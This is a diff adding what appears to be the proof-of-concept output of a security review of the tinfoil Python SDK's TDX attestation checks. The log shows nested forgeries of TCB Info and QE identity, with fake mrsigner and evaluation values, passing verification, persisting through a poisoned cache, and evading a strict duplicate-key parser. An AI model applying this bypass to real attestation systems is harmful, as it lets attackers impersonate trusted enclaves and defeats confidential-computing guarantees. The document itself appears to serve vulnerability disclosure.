@@ -1,0 +1,47 @@
+tinfoil package: /root/tinfoil-review/work/python-sdk-verifier/venv/lib/python3.14/site-packages/tinfoil/__init__.py
+
+nested TCB Info wire bytes (head/tail):
+   b'{"_":{"tcbInfo":{"id":"TDX","version":3,"issueDate":"2023-06-18T08:42:' b'...' b'"}]}]},"signature":"f6502d6fad1e3b7281df2b7eddc773d5b5281187346c12c5647b4f243cea49212be96a7a1a6b5d83e36323fe3fa9dacd61ebfbc38e631ff0fe29ef14ae0db0b4"}'
+  -> strict duplicate-key parser accepts both nested forgeries (no duplicate member anywhere)
+  -> known dup-key forgery is caught by a strict parser: duplicate keys: ['tcbInfo', 'tcbInfo']
+
+[unit] verify_tcb_info_signature(nested) passed; enforced tcbInfo: tcbEvalNum=99 levels=['UpToDate'] nextUpdate=2099-01-01
+[unit] verify_qe_identity_signature(nested) passed; enforced mrsigner=4141414141414141414141414141414141414141414141414141414141414141
+
+== A control: genuine Intel collateral, shipped config
+[A] REJECTED: ValueError: TDX attestation verification failed: Collateral validation failed: TCB Info tcbEvaluationDataNumber (15) is below minimum required (19). Collateral may be outda
+      fetched:
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/qe/identity?tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000&tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/certificates.trustedservices.intel.com/IntelSGXRootCA.der
+
+== B attack: NESTED forgery of tcbInfo + enclaveIdentity (no duplicate keys)
+[B] ACCEPTED by Document.verify(): tls_fp=6c62dec1b8191749... hpke=eb7406a38d1eed31...
+      tcb_level.status=UpToDate tcbEvalNum(TCB Info)=99 nextUpdate=2099-01-01 00:00:00+00:00 QE mrsigner used=dc9e2a7c6f948f17...
+      fetched:
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/qe/identity?tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000&tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/certificates.trustedservices.intel.com/IntelSGXRootCA.der
+
+== C persistence: later session, no network -> served from B's poisoned cache
+[C] ACCEPTED by Document.verify(): tls_fp=6c62dec1b8191749... hpke=eb7406a38d1eed31...
+      tcb_level.status=UpToDate tcbEvalNum(TCB Info)=99 nextUpdate=2099-01-01 00:00:00+00:00 QE mrsigner used=dc9e2a7c6f948f17...
+
+== D ablation: duplicate-key forgery under a dup-key-rejecting parser (the obvious fix)
+[D] REJECTED: ValueError: TDX attestation verification failed: Collateral validation failed: duplicate JSON member rejected (strict parser)
+      fetched:
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000&tcbEvaluationDataNumber=19
+
+== E attack: NESTED forgery under the same dup-key-rejecting parser
+[E] ACCEPTED by Document.verify(): tls_fp=6c62dec1b8191749... hpke=eb7406a38d1eed31...
+      tcb_level.status=UpToDate tcbEvalNum(TCB Info)=99 nextUpdate=2099-01-01 00:00:00+00:00 QE mrsigner used=dc9e2a7c6f948f17...
+      fetched:
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/qe/identity?tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000&tcbEvaluationDataNumber=19
+        https://tdx-proxy.tinfoil.sh/certificates.trustedservices.intel.com/IntelSGXRootCA.der
+
+SUMMARY: {'A': 'REJECT', 'B': 'ACCEPT', 'C': 'ACCEPT', 'D': 'REJECT', 'E': 'ACCEPT'}
+matches expected: True
